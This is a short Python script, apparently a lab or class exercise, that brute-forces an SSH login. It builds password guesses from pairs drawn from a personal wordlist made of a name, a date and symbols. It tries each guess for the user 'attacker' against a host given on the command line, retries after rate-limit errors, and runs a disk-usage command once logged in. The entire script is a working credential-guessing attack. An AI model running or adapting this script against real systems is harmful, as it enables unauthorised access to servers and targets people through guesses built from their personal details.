from itertools import permutations
from sys import argv
import paramiko 
import time

def ssh_connect(passwd, host):
	try:
		print('try passwd ', passwd)
		ssh.connect(username='attacker', hostname=host, password=passwd, banner_timeout=200)
	except paramiko.AuthenticationException:
		return False
	except paramiko.SSHException:
		print('login too frequently sleep for 10s')
		time.sleep(10)
		return ssh_connect(passwd, host)
	except:
		return False
	return True


dictionary = ['YueHan', 'Wang', 'YH', '1999',
              '0228', 'oscar', 'Realtek', '@', '_']
possible_passwd = [p[0] + p[1] for p in permutations(dictionary, 2)]
print(possible_passwd)


ssh = paramiko.SSHClient()
# add trusted server to host_allow
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
# try each password
for p in possible_passwd:
	if ssh_connect(p, argv[1]):
		break
		
stdin, stdout, stderr = ssh.exec_command('df -hl')
print(stdout.read().decode())

